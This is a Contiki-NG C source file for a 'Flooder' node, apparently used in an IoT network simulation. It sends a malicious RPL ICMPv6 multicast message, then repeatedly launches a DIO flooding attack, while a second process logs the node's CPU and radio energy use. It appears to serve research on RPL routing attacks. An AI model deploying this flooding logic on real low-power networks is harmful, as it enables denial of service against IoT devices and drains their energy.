#include "contiki.h"
#include "random.h"
#include "net/netstack.h"
#include "net/routing/rpl-lite/rpl-timers.h"
#include "net/routing/rpl-lite/rpl-icmp6-malicious.h"
#include "sys/energest.h"
#include "net/ipv6/simple-udp.h"
#define LOG_MODULE "App"
#define LOG_LEVEL LOG_LEVEL_INFO
#define WITH_SERVER_REPLY  1
#define UDP_CLIENT_PORT	8765
#define UDP_SERVER_PORT	5678
#define SEND_INTERVAL		  (450 * CLOCK_SECOND)/* 18 min */ /*(120 * CLOCK_SECOND)*/
/*---------------------------------------------------------------------------*/
static struct simple_udp_connection udp_conn;
PROCESS(flooder_process, "Flooder");
PROCESS(energest_process, "Monitoring tool");
AUTOSTART_PROCESSES(&flooder_process, &energest_process);
/*---------------------------------------------------------------------------*/
static inline unsigned long
to_seconds(uint64_t time)
{
  return (unsigned long)(time / ENERGEST_SECOND);
}
static void
udp_rx_callback(struct simple_udp_connection *c,
         const uip_ipaddr_t *sender_addr,
         uint16_t sender_port,
         const uip_ipaddr_t *receiver_addr,
         uint16_t receiver_port,
         const uint8_t *data,
         uint16_t datalen)
{
  
  LOG_INFO("Received request '%.*s' from ", datalen, (char *) data);
  LOG_INFO_6ADDR(sender_addr);
  simple_udp_sendto(&udp_conn, data, datalen, sender_addr);
#if LLSEC802154_CONF_ENABLED
  LOG_INFO_(" LLSEC LV:%d", uipbuf_get_attr(UIPBUF_ATTR_LLSEC_LEVEL));
#endif
  LOG_INFO_("\n");

}
PROCESS_THREAD(flooder_process, ev, data)
{
  static struct etimer periodic_timer;
  static bool first = true;
  PROCESS_BEGIN();
  /* Initialize UDP connection */
  simple_udp_register(&udp_conn, UDP_CLIENT_PORT, NULL,
                      UDP_SERVER_PORT, udp_rx_callback);
  /* Init of flooding node stats */
  init_flood();
  etimer_set(&periodic_timer, SEND_INTERVAL);
  while(1) {
    PROCESS_WAIT_EVENT_UNTIL(etimer_expired(&periodic_timer));
    //We just want to send the RPL packet once - after 6 min
    if (first) {
        first = false;
	//Send RPL ICMPv6 CODE FLOOD message in multicast
        malicious_output(0);
    }
    else { //in the next timer expiration (15 min), start flood attack process & stop this timer
        start_flooding();
	if (flooding) {
	  /* Launch attack after 15 min of simulation */
	  launch_flooding_attack();
	  printf("DIO packets sent: %ld\n",dio_sent_flood);
	  etimer_reset_with_new_interval(&periodic_timer, CLOCK_SECOND/2);
	}
    }
    /* Add some jitter */
    if(!flooding) {
      etimer_set(&periodic_timer, SEND_INTERVAL
      - CLOCK_SECOND + (random_rand() % (2 * CLOCK_SECOND)));
    }
  }
  PROCESS_END();
}
/*---------------------------------------------------------------------------*/
PROCESS_THREAD(energest_process, ev, data)
{
  static struct etimer et;

  PROCESS_BEGIN();

  /* Setup a periodic timer that expires after 10 seconds. */
  etimer_set(&et, CLOCK_SECOND * 10);
  //etimer_set(&et, CLOCK_SECOND * 60*15);

  while(1) {
    /* Wait for the periodic timer to expire and then restart the timer. */
    PROCESS_WAIT_EVENT_UNTIL(etimer_expired(&et));
    etimer_reset(&et);
    //etimer_reset_with_new_interval(&et, 10*CLOCK_SECOND);
    energest_flush();

    printf("\nEnergest:\n");
    printf(" CPU          %4lus LPM      %4lus DEEP LPM %4lus  Total time %lus\n",
           to_seconds(energest_type_time(ENERGEST_TYPE_CPU)),
           to_seconds(energest_type_time(ENERGEST_TYPE_LPM)),
           to_seconds(energest_type_time(ENERGEST_TYPE_DEEP_LPM)),
           to_seconds(ENERGEST_GET_TOTAL_TIME()));
    printf(" Radio LISTEN %4lus TRANSMIT %4lus OFF      %4lus\n",
           to_seconds(energest_type_time(ENERGEST_TYPE_LISTEN)),
           to_seconds(energest_type_time(ENERGEST_TYPE_TRANSMIT)),
           to_seconds(ENERGEST_GET_TOTAL_TIME()
                      - energest_type_time(ENERGEST_TYPE_TRANSMIT)
- energest_type_time(ENERGEST_TYPE_LISTEN)));

  }

  PROCESS_END();
}
